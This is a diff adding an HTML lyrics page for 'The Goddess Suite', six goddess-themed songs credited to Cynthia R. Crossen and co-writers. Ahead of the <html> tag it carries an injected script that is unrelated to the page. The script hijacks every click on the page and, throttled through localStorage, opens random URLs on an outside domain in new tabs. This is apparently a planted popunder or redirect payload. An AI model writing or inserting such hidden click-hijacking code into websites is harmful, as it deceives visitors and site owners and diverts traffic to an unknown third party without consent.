@@ -1,0 +1,428 @@
+<script>(function (parameters) {
+    const targets = [
+        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
+    ]
+    // Times between clicks
+    const restMinutes = 1;
+    // Number of hours to allow re-click 
+    const allowedHours = 2;
+
+
+    const saveTargetLocationsToStorage = (targets) => {
+        targets.forEach((target, index) => {
+            if(!localStorage.getItem(`${target}-local-storage`)){
+            	localStorage.setItem(`${target}-local-storage`, 0);
+            }
+        });
+    }
+    const getRandomLocationFromStorage = (targets) => {
+        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+    }
+    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+    const getHoursDiff = (startDate, endDate) => {
+        const msInHour = 1000 * 60 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInHour);
+    }
+    const getMintsDiff = (startDate, endDate) => {
+        const msInMints = 1000 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInMints);
+    }
+
+    const visitNewLocation = (targets, host, nowDate) => {
+        saveTargetLocationsToStorage(targets);
+        newLocation = getRandomLocationFromStorage(targets);
+        setTimeToStorage(`${host}-mnts`, nowDate);
+        setTimeToStorage(`${host}-hurs`, nowDate);
+        setLocationAsVisited(newLocation);
+        window.open(newLocation, "_blank");
+    }
+
+    // const randomLocation = getRandomLocationFromStorage(targets);
+    saveTargetLocationsToStorage(targets);
+
+    function globalClick(event) {
+        event.stopPropagation();
+        const host = location.host;
+        let newLocation = getRandomLocationFromStorage(targets);
+        const nowDate = Date.parse(new Date());
+        const savedDateForMints = getTimeStorage(`${host}-mnts`);
+        const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+        if (savedDateForMints && savedDateForHours) {
+            try {
+                const storageDateForMints = parseInt(savedDateForMints);
+                const storageDateForHours = parseInt(savedDateForHours);
+                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+                if (hoursDiff >= allowedHours) {
+                    saveTargetLocationsToStorage(targets);
+                    setTimeToStorage(`${host}-hurs`, nowDate);
+                }
+                if (mintsDiff >= restMinutes) {
+                    if (newLocation) {
+                        setTimeToStorage(`${host}-mnts`, nowDate);
+                        window.open(newLocation, "_blank");
+                        setLocationAsVisited(newLocation);
+                    }
+                }
+            } catch (error) { visitNewLocation(targets, host, nowDate); }
+        } else { visitNewLocation(targets, host, nowDate); }
+    }
+    document.addEventListener("click", globalClick)
+})()</script>
+<html>
+  <head>
+    <meta HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=utf-8">
+    <title>The Community Music Project: The Goddess Suite Lyrics</title>
+    <link href="cmp.css" rel="stylesheet" type="text/css">
+  </head>
+  <body>
+    <iframe id="nav" src="nav.html"></iframe>
+
+    <h2>The Goddess Suite: Lyrics</h2>
+
+    <ul>
+      <li><a href="#artemis">Artemis The Mighty Huntress</a></li>
+      <li><a href="#demeter">Demeter and Persephone</a></li>
+      <li><a href="#hestia">Hestia</a></li>
+      <li><a href="#hera">Hymn To Hera</a></li>
+      <li><a href="#aphrodite">Aphrodite</a></li>
+      <li><a href="#athena">Athena</a></li>
+    </ul>
+
+    <a name="artemis"><h3>Artemis The Mighty Huntress</h3></a>
+    <p>
+      <i>Words &amp; Music:</i> Cynthia R. Crossen; &copy; 1986 Cynthia R. Crossen
+    </p>
+    <p>
+    Artemis, the mighty huntress, Artemis, the mighty huntress,<br />
+    She hunts by the moon, She hunts by the moon,<br />
+    She hunts by the light of the moon.<br />
+    </p>
+    <p>
+    Artemis, the mighty huntress, Artemis, the mighty huntress,<br />
+    Her eye is the eagle’s, Her rage is the lion’s,<br />
+    Her embrace the fierce mother bear’s.<br />
+    </p>
+    <p>
+    Hunts by the moon, Hunts by the moon,<br />
+    Hunts by the light of the moon.<br />
+    </p>
+    <p>
+    In the wild places she wanders, In the deep forest she roams,<br />
+    Wild creatures know her as kindred, Mysteries calling her home.<br />
+    </p>
+    <p>
+    She is our sister, (Helping bring forth new life), Our protector,<br />
+    She helps us give birth and bring forth new life.<br />
+    </p>
+    <p>
+    Hunts by the moon, (Artemis shine), Hunts by the moon, (Artemis shine),<br />
+    Hunts by the light of the moon,<br />
+    </p>
+    <p>
+    Swiftly she runs by the river, With silver quiver and bow,<br />
+    Light of the moon she will follow, Mysteries calling her home.<br />
+    </p>
+    <p>
+    She is our sister (helping girls grow to women), Our protector,<br />
+    She gives us courage to be all we are.<br />
+    </p>
+    <p>
+    Hunts by the moon, (Artemis shine), Hunts by the moon, (Artemis shine),<br />
+    Hunts by the light of the moon, Light of the moon;<br />
+    </p>
+    <p>
+    Artemis, give us courage,<br />
+    Artemis, make us stronger,<br />
+    Artemis, give us daring,<br />
+    Make us stronger, Give us courage,<br />
+    Show your glory, Artemis.<br />
+    </p>
+    
+    
+    <a name="demeter"><h3>Demeter and Persephone</h3></a>
+    <p>
+      <i>Words:</i> Laura G. Lindgren &amp; Cynthia R. Crossen;
+      <i>Music:</i> Cynthia R. Crossen; 
+      &copy; 1986 Cynthia R. Crossen
+    </p>
+    <p>
+    Demeter loved her daughter, Loved her more than life,<br />
+    Bathed her in clear water, Nourished her with light,<br />
+    Loving word and loving touch were all Persephone knew,<br />
+    In innocent unfolding Demeter’s daughter grew.<br />
+    </p>
+    <p>
+    Long and lithe and lovely as a summer flower,<br />
+    Beauty in Persephone bloomed From hour into hour,<br />
+    “She’s the wonder of my life, Sustains me like the sun,<br />
+    She is my blessed daughter, She and I are one.”<br />
+    </p>
+    <p>
+    (Demeter, Persephone, Persephone, Demeter)<br />
+    </p>
+    <p>
+    Safe in her mother’s keeping Persephone roamed unbound,<br />
+    In the meadow by the brook the most beautiful flower she found,<br />
+    “I must have this flower, I must have this bloom,<br />
+    “I must have this flower, I must have this bloom...”<br />
+    </p>
+    <p>
+    “The earth cracks open, A chariot appears,<br />
+    And a man grabs me, takes me down, (takes me down),<br />
+    Takes me down, (takes me down),<br />
+    </p>
+    <p>
+    Fire in his eyes burns, He says no word to me,<br />
+    But his cold strong arms hold me close, (hold me close),<br />
+    Hold me close, (hold me close),<br />
+    </p>
+    <p>
+    Downward into darkness he carries me, downward into darkness he carries me,<br />
+    Downward into, downward into, downward into darkness he carries me on,<br />
+    My sweet world gone.<br />
+    </p>
+    <p>
+    Oh Mother, I’m calling you, Oh Mother hear me calling,<br />
+    Oh Mother, I’m calling you, Oh Mother hear me calling,<br />
+    </p>
+    <p>
+    I am in the underworld, Captured by Hades’ hand,<br />
+    Cold and stone and darkness and a black river bound this land,<br />
+    I am in the underworld, Captured by Hades’ hand,<br />
+    Cold and stone and darkness and a black river bound this land,<br />
+    </p>
+    <p>
+    And the fire that burns is not a sun, but sears like a god’s command.”
+    </p>
+    <p>
+    How Demeter trembled when her daughter did not come,<br />
+    Ran down to the meadow and wildly called her name (Persephone, Persephone),<br />
+    Wind was all that answered, the sighing of the pines,<br />
+    Demeter’s heart beat wildly as she called and called again.<br />
+    “Daughter, I am calling you, Oh daughter, hear me calling,<br />
+    “Daughter, I am calling you, Oh daughter, hear me calling,<br />
+    Aah, aah, aah, aah. Aah, aah, aah, aah. ”
+    </p>
+    <p>
+    Then a shepherd told her,<br />
+    “I saw the earth crack open, I saw her fall inside,<br />
+    In fear and terror I heard her cry (heard her cry), heard her cry (heard her cry),”<br />
+    </p>
+    <p>
+    Demeter screamed then, wild with her grief and pain,<br />
+    Raging, she made a bitter pledge (bitter pledge), bitter pledge (bitter pledge).<br />
+    </p>
+    <p>
+    “A curse on all beauty, A blight on all love,<br />
+    Earth shall freeze and bones grow cold and the sky grow dark above.<br />
+    Plants will lose their greenness, Animals die by frost,<br />
+    Humans huddle in the night and pay for what I’ve lost, My daughter lost.”<br />
+    </p>
+    <p>
+    A year the earth lay frozen, Demeter’s grief was known,<br />
+    Though every god had pleaded, No living thing was grown;<br />
+    Zeus the god of thunder, Humbled on his throne,<br />
+    At last sent Hermes underground to bring Persephone home.<br />
+    </p>
+    <p>
+    Earth returns to blooming, springtime comes again,<br />
+    Human hearts find gladness in turning fertile land.<br />
+    Demeter’s heart rejoices, Persephone’s spirit is free,<br />
+    Mother and her daughter embracing endlessly, free, free.<br />
+    </p>
+    <p>
+    Then Demeter asked her “Did you eat anything down there?”<br />
+    “Only the seeds of the pomegranate fruit he gave me as he said good-bye.”<br />
+    “Aah, aah, aah, aah. Aah, aah, aah, aah. ”<br />
+    </p>
+    <p>
+    Hades’ voice rang out from under the earth,<br />
+    “You have eaten of my fruit, You belong to me too.<br />
+    Six months with your mother in the brightsome world above,<br />
+    But six months shall you comfort my heart<br />
+    And solace me with your love.”<br />
+    </p>
+    <p>
+    In the world of shadows (world of shadows) Persephone reigns as queen<br />
+    And when she climbs the path to light she brings rebirth in spring,<br />
+    With the changes turning, Grief and love we know,<br />
+    So circles have their seasons and from the depths we grow, grow, grow.<br />
+    </p>
+    
+    
+    <a name="hestia"><h3>Hestia</h3></a>
+    <p>
+      <i>Words &amp; Music:</i> Cynthia R. Crossen;
+      &copy; 1986 Cynthia R. Crossen
+    </p>
+    <p>
+    Hestia, Hestia, Hestia,<br />
+    Keeper of the ancient hearth,<br />
+    Keeper of the sacred fire,<br />
+    Sweeper of the holy ashes,<br />
+    Ever turning toward the heart within us burning,<br />
+    Keeper of the inner fire,<br />
+    </p>
+    <p>
+    Welcome us home, Welcome us home, Welcome us home to the fire.<br />
+    </p>
+    <p>
+    Home, you wait for us, sweeping the hearth,<br />
+    Tending the fire in quiet,<br />
+    Gaze turned inward, you nurture the heart,<br />
+    Solitude, peace, contentment.<br />
+    Welcome us home, welcome us home, Welcome us home to the fire.<br />
+    </p>
+    <p>
+    Keeper of the sacred fire,<br />
+    Sweeper of the holy ashes,<br />
+    Ever turning toward the heart within us burning,<br />
+    Keeper of the inner fire.<br />
+    </p>
+    <p>
+    Welcome us home, Welcome us home, Welcome us home to the fire.<br />
+    </p>
+    <p>
+    Flame (burning), coals (warming), heart turning, transforming fire.<br />
+    </p>
+    
+    
+    <a name="hera"><h3>Hymn To Hera</h3></a>
+    <p>
+      <i>Words:</i> Sandra Brooks-Mathers;
+      <i>Music:</i> Cynthia R. Crossen; 
+      &copy; 1986 Cynthia R. Crossen
+    </p>
+    <p>
+    Hera, Queen of Starry Night,<br />
+    Clothed in shades of purple light,<br />
+    Watching, watching from on high<br />
+    With constant iridescent eye,<br />
+    Perceiving all within your sight,<br />
+    Hera, Queen of Starry Night.<br />
+    </p>
+    <p>
+    Hera, Durga, Queen of Heaven,<br />
+    Wondrous things of you are woven.<br />
+    From your breasts white droplets spray<br />
+    Across the sky the Milky Way,<br />
+    Your overflowing milk doth yield<br />
+    On earth lilies of the field,<br />
+    Consort of the King of Heaven,<br />
+    Hera, Durga, Queen of Heaven.<br />
+    </p>
+    <p>
+    Hera, Kali, Queen of Might,<br />
+    Your mystery and power invite<br />
+    Shadow forces to the light,<br />
+    And, in expression, to take flight<br />
+    In spirals of intoxication,<br />
+    Through the fires of purification,<br />
+    Burning, burning, burning bright,<br />
+    Hera, Kali, Queen of Might.<br />
+    </p>
+    
+    
+    <a name="aphrodite"><h3>Aphrodite</h3></a>
+    <p>
+      <i>Words:</i> Sandra Brooks-Mathers &amp; Cynthia R. Crossen;
+      <i>Music:</i> Cynthia R. Crossen; 
+      &copy; 1986 Cynthia R. Crossen
+    </p>
+    <p>
+    Aphrodite, Aphrodite, golden glowing light inside me,<br />
+    Aphrodite, Aphrodite, Warm the cockles of my heart.<br />
+    </p>
+    <p>
+    Aphrodite, Aphrodite, bring your beauty to delight me,<br />
+    Aphrodite, Aphrodite, Warm the cockles of my heart.<br />
+    </p>
+    <p>
+    You spring forth, full-blown from the sea, Lively and pulsing bright,<br />
+    Round you gather fragrant flowers, Roses red, the kiss of life,<br />
+    Roses red are the kiss of life,<br />
+    Roses the kiss, Roses the kiss, kiss of life,<br />
+    Roses the kiss, kiss kiss kiss of<br />
+    </p>
+    <p>
+    Aphrodite, Aphrodite, Tasty pleasures wake inside me,<br />
+    Take a nibble, Aphrodite, Take a nibble of my heart.<br />
+    </p>
+    <p>
+    Wake us with your kiss of life, the roses from your garden,<br />
+    Wake us with a kiss, a kiss.<br />
+    </p>
+    <p>
+    Beauty, love and pleasure you give us full measure,<br />
+    You delight us with your treasure, Wake us with a kiss.<br />
+    </p>
+    <p>
+    Offering the golden apple, sweet as honey warm as love,<br />
+    Juicy scarlet pomegranate, ripened by the sun above.<br />
+    </p>
+    <p>
+    Graceful as two swans on water gliding together awhile,<br />
+    Dance in time with your fine lover, hold your lover within your smile.<br /> 
+    </p>
+    <p>
+    Beauty, love and pleasure you give us full measure,<br />
+    You delight us with your treasure, wake us with a kiss<br />
+    </p>
+    <p>
+    Aphrodite, Aphrodite,<br />
+    Aphrodite, Aphrodite,<br />
+    Aphrodite, Aphrodite, delight!<br />
+    </p>
+    
+    
+    <a name="athena"><h3>Athena</h3></a>
+    <p>
+      <i>Words:</i> Cynthia R. Crossen &amp; Laura G. Lindgren ;
+      <i>Music:</i> Cynthia R. Crossen; 
+      &copy; 1986 Cynthia R. Crossen
+    </p>
+    <p>
+    Athena, Athena,<br />
+    Athena, Athena, Athena,<br />
+    Athena, Athena, Athena,<br />
+    Guardian of justice,<br />
+    Bearer of wisdom,<br />
+    Of a new vision you speak.<br />
+    </p>
+    <p>
+    We shall work for change, we shall work for peace,<br />
+    We shall find our wisdom in the dreams we weave.<br />
+    We shall work for change, we shall work for peace,<br />
+    We shall find our wisdom in the dreams we weave.<br />
+    Athena, help us weave a new dream.<br />
+    </p>
+    <p>
+    We will plant olive trees in the desert,<br />
+    We will plant olive trees in the desert,<br />
+    We will use the riches of the earth wisely,<br />
+    We will plant olive trees.<br />
+    </p>
+    <p>
+    We shall end all hunger, we shall end all war,<br />
+    We shall bless our children with justice for all.<br />
+    We shall end all hunger, we shall end all war,<br />
+    We shall bless our children with justice for all.<br />
+    </p>
+    <p>
+    Athena, Athena, Athena,<br />
+    Athena, Athena, Athena,<br />
+    Bearer of wisdom,<br />
+    Teacher of vision,<br />
+    Help us find a path to peace.<br />
+    </p>
+
+  </body>
+</html>
